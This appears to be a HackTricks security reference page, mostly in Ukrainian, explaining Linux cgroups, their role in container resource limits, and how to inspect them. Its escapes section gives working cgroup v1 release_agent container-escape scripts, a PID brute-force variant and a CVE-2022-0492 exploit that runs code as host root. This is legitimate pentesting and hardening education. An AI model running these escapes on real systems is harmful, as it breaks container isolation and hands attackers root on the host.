# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux **control groups** — механізм ядра, який використовується для групування процесів задля обліку, обмеження, пріоритизації та застосування політик. Якщо namespaces здебільшого про ізоляцію огляду ресурсів, то cgroups здебільшого про регулювання того, **скільки** цих ресурсів набір процесів може споживати і, в деяких випадках, **з якими класами ресурсів** вони взагалі можуть взаємодіяти. Containers постійно покладаються на cgroups, навіть якщо користувач ніколи безпосередньо на них не дивиться, оскільки майже кожен сучасний runtime потребує способу повідомити ядру "ці процеси належать цій робочому навантаженню, і до них застосовуються такі правила щодо ресурсів".

Ось чому container engines розміщують новий container у власному cgroup subtree. Коли дерево процесів знаходиться там, runtime може обмежити пам'ять, лімітувати кількість PID, встановлювати вагу використання CPU, регулювати I/O та обмежувати доступ до пристроїв. У production середовищі це критично як для безпеки multi-tenant, так і для простої операційної гігієни. Container без значущого контролю ресурсів може вичерпати пам'ять, залити систему процесами або монополізувати CPU та I/O таким чином, що хост або сусідні робочі навантаження стануть нестабільними.

З точки зору безпеки, cgroups важливі у двох окремих вимірах. По-перше, погані або відсутні обмеження ресурсів дозволяють прості атаки типу denial-of-service. По-друге, деякі можливості cgroup, особливо в старіших налаштуваннях **cgroup v1**, історично створювали потужні примітиви для виходу за межі контейнера, коли вони були записуваними зсередини container.

## v1 Vs v2

Існує два основні моделі cgroup. **cgroup v1** відкриває кілька ієрархій контролерів, і старі описи експлойтів часто концентруються навколо дивних і іноді надто потужних семантик, доступних там. **cgroup v2** вводить більш уніфіковану ієрархію та загалом чистішу поведінку. Сучасні дистрибутиви дедалі частіше віддають перевагу cgroup v2, але змішані або легасі середовища все ще існують, отже обидві моделі залишаються актуальними при огляді реальних систем.

Різниця важлива, бо деякі з найвідоміших історій про вихід із контейнера, такі як зловживання **`release_agent`** в cgroup v1, дуже конкретно пов'язані з старою поведінкою cgroup. Читач, який бачить експлойт для cgroup у блозі і сліпо застосовує його до сучасної системи лише з cgroup v2, ймовірно, неправильно зрозуміє, що насправді можливо на цільовій системі.

## Перевірка

Найшвидший спосіб побачити, де знаходиться ваша поточна shell, — це:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Файл /proc/self/cgroup показує шляхи cgroup, пов'язані з поточним процесом. На сучасному cgroup v2 host ви часто побачите уніфікований запис. На старіших або гібридних host ви можете побачити кілька шляхів контролерів v1. Як тільки ви знаєте шлях, можна переглянути відповідні файли в /sys/fs/cgroup, щоб побачити ліміти та поточне використання.

На cgroup v2 host корисні такі команди:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Ці файли показують, які контролери існують і які з них делеговані дочірнім cgroups. Ця модель делегування важлива в rootless та systemd-керованих середовищах, де runtime може контролювати лише ту підмножину функціональності cgroup, яку фактично делегує батьківська ієрархія.

## Лабораторна робота

Один зі способів спостерігати cgroups на практиці — запустити контейнер з обмеженням пам'яті:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Ви також можете спробувати контейнер з обмеженням PID:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Ці приклади корисні, оскільки допомагають зв’язати runtime-флаг з файловим інтерфейсом ядра. Runtime не застосовує правило магічно; він записує відповідні налаштування cgroup і потім дозволяє ядру застосувати їх до дерева процесів.

## Використання Runtime

Docker, Podman, containerd, and CRI-O покладаються на cgroups під час нормальної роботи. Різниця зазвичай полягає не в тому, чи вони використовують cgroups, а в тому, **які значення за замовчуванням вони обирають**, **як вони взаємодіють із systemd**, **як працює rootless delegation**, і **наскільки конфігурація контролюється на рівні engine проти рівня оркестрації**.

У Kubernetes запити ресурсів і ліміти в підсумку стають конфігурацією cgroup на вузлі. Шлях від Pod YAML до застосування правил ядром проходить через kubelet, CRI runtime і OCI runtime, але саме cgroups залишаються механізмом ядра, який остаточно застосовує правило. В середовищах Incus/LXC cgroups також інтенсивно використовуються, особливо тому, що system containers часто відкривають багатше дерево процесів і очікування, схожі на VM.

## Неправильні налаштування і втечі

Класична історія безпеки cgroup — це записуваний механізм **cgroup v1 `release_agent`**. У цій моделі, якщо нападник може записувати в потрібні файли cgroup, увімкнути `notify_on_release` і контролювати шлях, збережений у `release_agent`, ядро може виконати обраний нападником шлях у початкових неймспейсах на хості, коли cgroup стає порожньою. Саме тому старі огляди приділяли так багато уваги записуваності контролерів cgroup, опціям монтування та умовам namespace/capability.

Навіть коли `release_agent` недоступний, помилки в конфігурації cgroup все одно мають значення. Надмірно широкі права доступу до пристроїв можуть зробити пристрої хоста доступними з контейнера. Відсутні обмеження пам’яті та PID можуть перетворити просте виконання коду на DoS хоста. Слабка делегація cgroup у rootless-сценаріях також може ввести захисників в оману, змусивши їх припустити існування обмеження, коли runtime ніколи насправді не зміг його застосувати.

### Передумови `release_agent`

Техніка `release_agent` застосовується лише до **cgroup v1**. Основна ідея в тому, що коли останній процес у cgroup завершується і встановлено `notify_on_release=1`, ядро виконує програму, шлях до якої збережено в `release_agent`. Це виконання відбувається в початкових неймспейсах на хості, що і перетворює записуваний `release_agent` на примітив для втечі з контейнера.

Щоб техніка спрацювала, нападникові зазвичай потрібні:

- записувана **cgroup v1** ієрархія
- можливість створити або використати дочірню cgroup
- можливість встановити `notify_on_release`
- можливість записати шлях у `release_agent`
- шлях, який з точки зору хоста резольвиться в виконуваний файл

### Класичний PoC

Історичний однострічковий PoC такий:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Цей PoC записує шлях payload у `release_agent`, ініціює cgroup release, а потім читає файл виводу, створений на host.

### Зрозумілий покроковий опис

Ту саму ідею легше зрозуміти, розбивши її на кроки.

1. Створіть і підготуйте записувану cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Визначте шлях на хості, який відповідає файловій системі контейнера:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Помістіть payload, який буде видимий зі шляху хоста:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Викличте виконання, зробивши cgroup порожньою:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Ефект — виконання payload на стороні хоста з root-привілеями. У реальному експлойті payload зазвичай записує proof file, відкриває reverse shell або змінює стан хоста.

### Варіант з відносним шляхом із використанням `/proc/<pid>/root`

У деяких середовищах шлях на хості до файлової системи контейнера неочевидний або прихований драйвером зберігання. У такому випадку шлях до payload можна виразити через `/proc/<pid>/root/...`, де `<pid>` — це host PID, що належить процесу в поточному контейнері. Саме це і є основою relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Суттєвий прийом тут — не само brute force, а форма шляху: `/proc/<pid>/root/...` дозволяє ядру отримати доступ до файлу всередині файлової системи контейнера з простору імен хоста, навіть коли прямий шлях до сховища хоста невідомий наперед.

### CVE-2022-0492 Варіант

У 2022 році CVE-2022-0492 показав, що запис у `release_agent` в cgroup v1 неправильно перевіряв наявність `CAP_SYS_ADMIN` у **початковому** просторі імен користувача. Це зробило техніку набагато доступнішою на вразливих ядрах, оскільки процес у контейнері, який міг монтувати ієрархію cgroup, міг записати в `release_agent` без наявності привілеїв у просторі імен користувача хоста.

Мінімальний експлойт:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
На вразливому ядрі хост виконує `/proc/self/exe` з привілеями root хоста.

Для практичного зловживання почніть з перевірки, чи середовище все ще надає доступні для запису шляхи cgroup-v1 або небезпечний доступ до пристроїв:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Якщо `release_agent` присутній і доступний для запису, ви вже в зоні legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Якщо шлях cgroup сам по собі не дає escape, наступне практичне використання часто — denial of service або reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Ці команди швидко покажуть, чи має workload можливість виконати fork-bomb, агресивно споживати пам'ять або зловживати записуваним застарілим інтерфейсом cgroup.

## Перевірки

Під час аналізу цілі мета перевірок cgroup — дізнатися, яка модель cgroup використовується, чи бачить container доступні для запису шляхи контролера, і чи взагалі актуальні старі breakout primitives, такі як `release_agent`.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Увімкнено за замовчуванням | Контейнери автоматично розміщуються в cgroups; ліміти ресурсів опціональні, якщо не вказані через прапори | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Увімкнено за замовчуванням | `--cgroups=enabled` є значенням за замовчуванням; поведінка cgroup namespace залежить від версії cgroup (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, послаблений доступ до пристроїв, `--privileged` |
| Kubernetes | Увімкнено через runtime за замовчуванням | Pods і контейнери розміщуються в cgroups runtime'ом ноди; тонкий контроль ресурсів залежить від `resources.requests` / `resources.limits` | пропускання resource requests/limits, привілейований доступ до пристроїв, неправильна конфігурація runtime на хості |
| containerd / CRI-O | Увімкнено за замовчуванням | cgroups є частиною нормального lifecycle management | прямі налаштування runtime, що послаблюють контроль пристроїв або відкривають спадкові writable cgroup v1 інтерфейси |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
